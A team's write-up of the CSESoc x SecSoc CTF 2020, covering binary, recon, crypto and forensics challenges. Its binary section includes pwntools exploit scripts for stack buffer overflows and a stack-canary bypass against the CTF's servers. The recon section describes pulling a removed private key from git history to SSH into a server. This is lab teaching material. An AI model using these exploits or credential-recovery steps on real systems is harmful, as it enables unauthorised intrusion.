# CSESoc x SecSoc CTF 2020

Despite entering as a team of 4, the CTF was just completed by myself and my good friend [featherbear](!https://featherbear.cc/)! We managed to claim first place, being ahead of second place by 20 points.

## Binary
These challenges were done by examining the disassembly using Binary Ninja.

### simple
_Key observations:_
* `gets` is used - possible overflow vulnerability
* to take the winning branch, the value at [ebp-0xc] must equal 0x37333331
* buffer starts being written at [ebp-0x20]

_Overview:_
* pad the payload to allow 0x37333331 to be written at [ebp-0xc]

_Code:_
``` python
from pwn import *

p = remote('pwn.ctf.unswsecurity.com', 7004)

p.interactive()
```

### exit 1337
_Key observations:_
* 1337%256 = 57 -> `exit` must be given 57 as its argument
* `gets` is used in `vuln` - possible overflow vulnerability
* buffer starts being written at [ebp-0x26]

_Overview:_
* pad the payload to until the return address location at [ebp+4]
* overwrite the return address with the address of where `exit` is called
* append the required value afterwards to set is as the argument

_Code:_
```python
from pwn import *

p = remote('pwn.ctf.unswsecurity.com', 7006)

payload = b''
# pad until the return address
payload += b'A' * (0x26+0x4)
# overwrite return address with address when
#   exit is called
payload += p32(0x8049219)
# set the required argument value
payload += p32(57)

p.sendline(payload)

p.interactive()
```

### slightly simple
_Key observations:_
* `gets` is used in `lol` - possible overflow vulnerability
* buffer starts being written at [ebp-0x20]
* canary check occurs with a value at [ebp-0xc]
* canary value is printed out
* `win` function is provided

_Overview:_
* obtain the given canary value
* pad the payload to until the canary location at [ebp-0xc]
* rewrite the canary
* pad the rest of the payload
* overwrite the return address with the win function

_Code:_
```python
from pwn import *

p = remote('pwn.ctf.unswsecurity.com', 7005)

# obtain the canary value
p.recvuntil('hi\n')
canary = p.recvuntil('\n', drop=True)
canary = b'0x' + canary
canary = int(canary, 16)

payload = b''
# pad until the canary
payload += b'A' * (0x20-0xC)
# overwrite the canary
payload += p32(canary)
# pad till the return address
payload += b'A' * 0xC
# overwrite return address
payload += p32(0x80491c6)

p.sendline(payload)

p.interactive()
```

## Recon
### dorf0 - sneaky shouts
_Key observations:_
* location was at 33-39 hunter st
* clue was frankie the fox

_Overview:_
* frankie's pizza is on hunter st

### dorf1 - you're fired
_Key observations:_
* required: twitter
*  team page has a commented section about a guy named Robert Northcote
* robots.txt file had a path...

_Overview:_
* path from robots.txt lead to rob's 'personal' page
* link to his twitter was there

### dorf2 - git lost
_Key observations:_
* required: github
* no other links on the website
* names of staff are on the team page

_Overview:_
* search on github for the staff
* charlie warner - CEO of Dorf can be found, alongside his username

### dorf3 - ssshhhh!! this is a library
_Key observations:_
* CEO has starred a repo from the fired employee
* repo contains dorf site files

_Overview:_
* check previous commits
* config file was once pushed and then removed - `bf99018`
* private key was also once pushed and then removed - `5e702ce`
* ssh into server to obtain the flag

## Crypto
### csesoc x secsoc
_Key observations:_
* anagram

_Overview:_
* used an [anagram solver](!https://anagram-solver.net/)

### julius caesar
_Key observations:_
* possible caesar cypher?

_Overview:_
* it was not a caesar cypher
* used a [vigenere decoder](!https://www.dcode.fr/vigenere-cipher) set with nowing a plain text word
* found possible solutions - guess and check

## Forensics
### broken code
An [online hex editor](!https://hexed.it/) was used to modify the given png file.

_Key observations:_
* first four bytes of the header are overwritten

_Overview:_
* change the first four bytes to `89 50 4E 47` which are the first bytes of the PNG header signature
* save the file and it should now be able to be opened

## not a challenge
_Key observations:_
* what?

_Overview:_
* `file` was used to determine the correct file type
* a.notazip was opened as a zip
* a.png was opened as a pdf

### steganosaurus
_Key observations:_
* hint lead me to this [online steganography decoder](!http://stylesuxx.github.io/steganography/)
* challenge description seemed to be a pangram

_Overview:_
* used the decoder to find the string required
* pangram was used to solve the substitution cypher